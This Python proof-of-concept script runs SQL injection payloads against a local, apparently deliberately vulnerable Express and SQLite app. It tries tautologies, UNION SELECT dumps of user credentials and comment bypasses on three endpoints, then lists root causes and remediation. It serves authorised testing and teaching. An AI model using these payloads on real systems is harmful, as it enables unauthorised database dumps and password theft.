#!/usr/bin/env python3
"""
PoC Script - SQL Injection Vulnerabilities
Target: sql-injection-nodejs (Express + SQLite via better-sqlite3)
Author: PoC Generator

Endpoints tested:
  1. GET  /users?id=<payload>         → query-parameter injection
  2. POST /users/search               → JSON body injection
  3. GET  /users/name/<payload>       → path-parameter injection

DISCLAIMER: For educational / authorized testing purposes only.
"""

import requests
import json
import sys

BASE_URL = "http://127.0.0.1:8081"

# ANSI colours
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def banner():
    print(f"""
{BOLD}{CYAN}╔══════════════════════════════════════════════════════════╗
║      SQL Injection PoC — sql-injection-nodejs            ║
║      Target : {BASE_URL}                   ║
╚══════════════════════════════════════════════════════════╝{RESET}
""")


def separator(title: str):
    print(f"\n{BOLD}{YELLOW}{'─'*60}")
    print(f"  {title}")
    print(f"{'─'*60}{RESET}")


def check_server() -> bool:
    """Verify the server is reachable before running attacks."""
    separator("Checking server availability")
    try:
        r = requests.get(f"{BASE_URL}/users?id=1", timeout=5)
        if r.status_code == 200:
            print(f"  {GREEN}[✔] Server is up — HTTP {r.status_code}{RESET}")
            return True
        print(f"  {RED}[✘] Unexpected status: {r.status_code}{RESET}")
        return False
    except requests.exceptions.ConnectionError:
        print(f"  {RED}[✘] Cannot connect to {BASE_URL}{RESET}")
        print(f"      Start the server first:")
        print(f"        cd sql-injection-nodejs")
        print(f"        npm install && node server.js")
        return False


def print_result(label: str, payload, url: str, status: int, data: list):
    vuln = len(data) > 1
    colour = GREEN if vuln else CYAN
    tag    = "VULN" if vuln else "INFO"
    print(f"\n  [{colour}{tag}{RESET}] {label}")
    print(f"         Payload : {BOLD}{payload}{RESET}")
    print(f"         URL     : {url}")
    print(f"         Status  : HTTP {status}  |  Records returned: {colour}{len(data)}{RESET}")
    for u in data:
        print(f"           → id={u.get('id')}  user={u.get('username')}  "
              f"email={u.get('email')}  {RED}password={u.get('password')}{RESET}")


# ─────────────────────────────────────────────────────────────
# VECTOR 1 — GET /users?id=  (query-parameter injection)
# Vulnerable code in server.js:
#   const query = `SELECT ... WHERE id = ${userID}`;
# ─────────────────────────────────────────────────────────────
def vuln1_query_param():
    separator("VECTOR 1 — GET /users?id=<payload>  [Query-Parameter SQLi]")

    payloads = [
        ("Normal request (id=1)",                          "1"),
        ("Auth bypass — OR 1=1--",                         "1 OR 1=1--"),
        ("UNION attack — dump all users",                  "0 UNION SELECT id,username,email,password FROM users--"),
        ("Always-true tautology",                          "1 OR 'a'='a'"),
        ("Comment-based bypass",                           "1/**/OR/**/1=1--"),
        ("Stacked boolean",                                "0 OR 1"),
    ]

    for label, payload in payloads:
        url = f"{BASE_URL}/users?id={requests.utils.quote(payload)}"
        try:
            r = requests.get(url, timeout=5)
            data = r.json() if isinstance(r.json(), list) else []
            print_result(label, payload, url, r.status_code, data)
        except Exception as e:
            print(f"  {RED}[ERR] {label}: {e}{RESET}")


# ─────────────────────────────────────────────────────────────
# VECTOR 2 — POST /users/search  (JSON body injection)
# Vulnerable code in server.js:
#   const query = `SELECT ... WHERE username LIKE '%${search}%' ...`;
# ─────────────────────────────────────────────────────────────
def vuln2_post_body():
    separator("VECTOR 2 — POST /users/search  [JSON Body SQLi]")

    payloads = [
        ("Normal search",                              "admin"),
        ("OR tautology — dump all users",              "' OR '1'='1"),
        ("UNION attack — extract all users",           "x%' UNION SELECT id,username,email,password FROM users--"),
        ("Comment-based bypass",                       "' OR 1=1--"),
        ("Wildcard escape",                            "admin' OR username LIKE '%"),
        ("Always-true with comment",                   "%' OR 'x'='x"),
    ]

    url = f"{BASE_URL}/users/search"
    for label, payload in payloads:
        body = {"search": payload}
        try:
            r = requests.post(url, json=body, timeout=5)
            data = r.json() if isinstance(r.json(), list) else []
            print_result(label, json.dumps(body), url, r.status_code, data)
        except Exception as e:
            print(f"  {RED}[ERR] {label}: {e}{RESET}")


# ─────────────────────────────────────────────────────────────
# VECTOR 3 — GET /users/name/<payload>  (path-parameter injection)
# Vulnerable code in server.js:
#   const query = `SELECT ... WHERE username = '${name}'`;
# ─────────────────────────────────────────────────────────────
def vuln3_path_param():
    separator("VECTOR 3 — GET /users/name/<payload>  [Path-Parameter SQLi]")

    payloads = [
        ("Normal lookup",                          "admin"),
        ("OR tautology — dump all users",          "admin' OR '1'='1"),
        ("UNION attack — extract all users",       "x' UNION SELECT id,username,email,password FROM users--"),
        ("Always-true with comment",               "x' OR 1=1--"),
        ("LIKE-based wildcard bypass",             "x' OR username LIKE '%"),
        ("String termination escape",              "admin'--"),
    ]

    for label, payload in payloads:
        encoded = requests.utils.quote(payload, safe="")
        url = f"{BASE_URL}/users/name/{encoded}"
        try:
            r = requests.get(url, timeout=5)
            data = r.json() if isinstance(r.json(), list) else []
            print_result(label, payload, url, r.status_code, data)
        except Exception as e:
            print(f"  {RED}[ERR] {label}: {e}{RESET}")


# ─────────────────────────────────────────────────────────────
# Summary
# ─────────────────────────────────────────────────────────────
def summary():
    separator("Summary")
    print(f"""
  {BOLD}Vulnerabilities confirmed:{RESET}

  {RED}[SQLi] SQL Injection — Query Parameter{RESET}
      Endpoint   : GET /users?id=<payload>
      Root cause : Template literal interpolation in server.js line ~54
                   `SELECT ... WHERE id = ${{userID}}`
      Impact     : Full DB dump, authentication bypass

  {RED}[SQLi] SQL Injection — POST Body (LIKE clause){RESET}
      Endpoint   : POST /users/search  {{"search": "<payload>"}}
      Root cause : Template literal interpolation in server.js line ~78
                   `SELECT ... WHERE username LIKE '%${{search}}%'`
      Impact     : Full DB dump via UNION or tautology

  {RED}[SQLi] SQL Injection — Path Parameter{RESET}
      Endpoint   : GET /users/name/<payload>
      Root cause : Template literal interpolation in server.js line ~100
                   `SELECT ... WHERE username = '${{name}}'`
      Impact     : Full DB dump, auth bypass

  {RED}[INFO] Sensitive Data Exposure{RESET}
      All three endpoints return plain-text passwords in JSON responses.

  {BOLD}Remediation:{RESET}
      • Use parameterised statements with better-sqlite3:
          db.prepare('SELECT ... WHERE id = ?').all(userID)
      • Never interpolate user input into SQL strings
      • Hash passwords with bcrypt / argon2 — never store or return plain text
      • Strip / validate input types (e.g. ensure id is an integer)
""")


def main():
    banner()
    if not check_server():
        sys.exit(1)

    vuln1_query_param()
    vuln2_post_body()
    vuln3_path_param()
    summary()


if __name__ == "__main__":
    main()
